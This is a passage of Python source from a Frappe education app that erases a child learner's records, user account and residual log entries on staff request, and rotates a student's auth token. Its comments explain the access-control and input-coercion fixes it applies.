        frappe.db.delete(table, {"name": ["in", names[i:i + 500]]})


def _safe_delete(table, filters):
    """One best-effort bookkeeping delete, isolated: a table this site does not have, or a
    statement that loses a race with a concurrent writer (MariaDB 1020/1213), must not
    abandon the remaining scrub steps. Only ever called AFTER the erasure has committed."""
    if not frappe.db.exists("DocType", table):
        return
    try:
        frappe.db.delete(table, filters)
    except Exception:
        frappe.log_error("Student erasure: residue scrub could not clear " + table,
                         frappe.get_traceback())


def _like_literal(val):
    """Escape a doc name for use as an exact LIKE literal — an id containing % or _ must
    not turn a targeted match into a wildcard that could sweep another child's rows."""
    return (val or "").replace("\\", "\\\\").replace("%", r"\%").replace("_", r"\_")


def _erase_student_user(user, receipt=None):
    """An online learner's identity also lives in a Frappe User (synthetic
    *.hikmat.invalid). Delete it; if something still links to it, at least disable
    it and scrub the name so no identifying text survives."""
    if not user or not frappe.db.exists("User", user):
        return
    try:
        frappe.delete_doc("User", user, force=1, ignore_permissions=True,
                          delete_permanently=True)
        if receipt is not None:
            receipt.append(("User", user))
            # User.on_trash cascades to Notification Settings (named after the email) WITHOUT
            # delete_permanently, so Frappe archives her email + that doc's JSON in Deleted
            # Document — which defeats the point of delete_permanently. Named here so the
            # residue scrub reaches both it and its delete-feed comment.
            receipt.append(("Notification Settings", user))
    except Exception:
        frappe.log_error("Student erasure: User delete failed, scrubbing instead",
                         frappe.get_traceback())
        frappe.db.set_value("User", user, {"enabled": 0, "full_name": "Erased",
                                           "first_name": "Erased", "middle_name": None,
                                           "last_name": None, "username": None},
                            update_modified=False)


def _scrub_name_residue(receipt, student=None, user=None):
    """Best-effort scrub of the plaintext residue Frappe's own cleanup cannot reach. After a
    "delete ALL her data" a full-table scan still found her id, name or user in:
      * Comment — Frappe's delete feed (model/delete_doc.py insert_feed) writes
        comment_type='Deleted', subject='<DocType> <name>' and NO reference_name, so the
        reference-keyed cleanup can never match those rows: "Student <id>" survives
        forever.
      * Notification Log / DocShare / Version / ToDo / … — see _RESIDUE_TABLES: cleaned only
        by a QUEUED job, i.e. not at all on a site with no worker.
      * Deleted Document — a cascaded child deleted without delete_permanently (her
        Notification Settings) is archived as JSON, defeating delete_permanently.
      * DefaultValue / Document Follow / bell alerts addressed to her own user id.

    Matching is by EXACT doc name, or by her unique student/user id — never by a free-text
    search for her NAME: two girls in one cohort can share a name and only she may be erased.
    Best-effort, one statement at a time (_safe_delete): her actual data rows are already gone
    and COMMITTED by the time this runs, so a bookkeeping table this site does not have — or
    one statement losing a race with a concurrent writer — must neither turn erasure into a
    500 nor abandon the rest of the scrub. CALL THIS AFTER THE COMMIT, never inside the
    erasure transaction: a statement error can make MariaDB roll the transaction back, and
    tidying bookkeeping is not worth risking the erasure itself."""
    by_dt = {}
    for dt, name in receipt:
        if name:
            by_dt.setdefault(dt, []).append(name)
    for dt, names in by_dt.items():
        for i in range(0, len(names), 500):
            chunk = names[i:i + 500]
            for table, (dt_field, name_field) in _RESIDUE_TABLES.items():
                _safe_delete(table, {dt_field: dt, name_field: ["in", chunk]})
            # the reference_name-less delete feed: match its exact subject instead
            subjects = ["%s %s" % (dt, n) for n in chunk]
            label = _(dt)
            if label != dt:                  # the feed subject is translated
                subjects += ["%s %s" % (label, n) for n in chunk]
            _safe_delete("Comment", {"comment_type": "Deleted", "reference_doctype": dt,
                                     "subject": ["in", subjects]})
    # Bell alerts whose document_name is a COMPOSITE embedding her id. Nothing writes these
    # any more (the milestone check that produced "EV-<student>-<milestone>" was removed in
    # v17), but rows from before that are still on disk and must still be erased on request.
    if student and frappe.db.exists("DocType", "Notification Log"):
        _safe_delete("Notification Log",
                     {"document_name": ("like", "%" + _like_literal(student) + "%")})
    if user:
        for table, field in (("Notification Log", "for_user"), ("Notification Log", "from_user"),
                             ("DocShare", "user"), ("Document Follow", "user"),
                             ("DefaultValue", "parent"), ("Deleted Document", "deleted_name")):
            _safe_delete(table, {field: user})
        frappe.clear_cache(user=user)


def _erasure_residue(student):
    """True when rows keyed on this student id outlive her Student row — a half-finished
    erasure (or one done by an older code path) that a re-run should FINISH rather than
    refuse with not_found."""
    for dt in _LEARNER_DOCTYPES:
        if _erasable(dt, {"student": student}):
            return True
    return False


@frappe.whitelist()   # STAFF-ONLY — enforced by _require_staff(), not by the decorator
def delete_student(student):
    """Erase a child's record and ALL her data (right-to-erasure for minors' data):
    attempts, tests, doubts, events, attendance, evaluations, AI chats, her parental-consent
    record and phone-verification challenges, and the Frappe User of an online learner. Staff
    only. Use from Desk or a trusted admin tool.

    The _require_staff() call is the ONLY thing that makes that true — do not remove it
    and do not trust the decorator instead. This function used to carry the comment "NOT
    allow_guest → requires a logged-in Desk user", which was false: a bare whitelist
    refuses only Guest, and every online learner is a Website User. A verifier logged in
    as an ordinary learner and got {"ok": true, "deleted": "<another girl>"} — one
    unauthenticated-by-role POST away from irreversible, unrecoverable data loss for a
    child (delete_permanently=1 leaves no Deleted Document to restore from).

    ROWS IN ONE TRANSACTION. Everything down to the commit is a single transaction, so a
    failure part-way through erases nothing and leaves the Student row (and her user link)
    intact — a re-run then simply redoes the whole job. Where an older run left a partial
    erasure behind, _erasure_residue lets a re-run finish it, and the same check after the
    commit is what stops this from reporting a success it did not achieve. `incomplete`
    means "nothing was promised, run it again"."""
    _require_staff()
    student = _docname(student)   # scalars only (see _docname): a dict here is an ORM FILTER,
    if not student:               # so it would resolve to — and irreversibly erase — SOME
        return {"ok": False, "error": "not_found"}   # OTHER girl than the one named
    sinfo = frappe.db.get_value("Student", student, ["student_name", "user"], as_dict=True) or {}
    if not sinfo and not _erasure_residue(student):
        return {"ok": False, "error": "not_found"}
    receipt = []
    for dt in _LEARNER_DOCTYPES:
        _erase(dt, _erasable(dt, {"student": student}), receipt)
    if sinfo.get("user"):
        # drop the link BEFORE the User goes, so the Student row never points at a
        # deleted User even for the rest of this transaction
        frappe.db.set_value("Student", student, "user", None, update_modified=False)
        _erase_student_user(sinfo.get("user"), receipt)
    if sinfo:
        frappe.delete_doc("Student", student, force=1, ignore_permissions=True,
                          delete_permanently=True)
        receipt.append(("Student", student))
    frappe.db.commit()
    # Never report success on a rollback we did not notice: a statement error or lock
    # timeout anywhere above can make MariaDB roll the whole transaction back, and a
    # facilitator told "erased" cannot un-tell a child. Re-running is safe and idempotent.
    if frappe.db.exists("Student", student) or _erasure_residue(student):
        return {"ok": False, "error": "incomplete"}
    # bookkeeping residue last of all, outside the erasure transaction (see the helper)
    _scrub_name_residue(receipt, student=student, user=sinfo.get("user"))
    frappe.db.commit()
    return {"ok": True, "deleted": sinfo.get("student_name"), "resumed": not sinfo}


@frappe.whitelist()   # STAFF-ONLY — enforced by _require_staff(), not by the decorator
def revoke_student_token(student):
    """Force a student to re-login everywhere: rotate their auth_token to a fresh value so any
    cached token (e.g. on a lost/handed-down laptop) stops working immediately. Use from Desk.

    Staff only, for the same reason as delete_student — the bare whitelist let any online
    learner log any other girl out of her own offline device (a denial of service on a
    campus laptop that may not see the internet again for days, i.e. she cannot re-login)."""
    _require_staff()
    # Scalars only (see _docname), even behind the staff gate: this writes with
    # frappe.db.set_value, where a dict `student` is an ORM FILTER, so {"active": 1} would log
    # EVERY girl on the site out of her offline device in one call. It does not go through
    # _token_for, so that sink's coercion never sees it — the guard has to be here.
    student = _docname(student)
    if not student or not frappe.db.exists("Student", student):
        return {"ok": False, "error": "not_found"}
    frappe.db.set_value("Student", student,
                        {"auth_token": frappe.generate_hash(length=40),
                         "token_issued_on": frappe.utils.now()},
                        update_modified=False)
    frappe.db.commit()
    return {"ok": True}
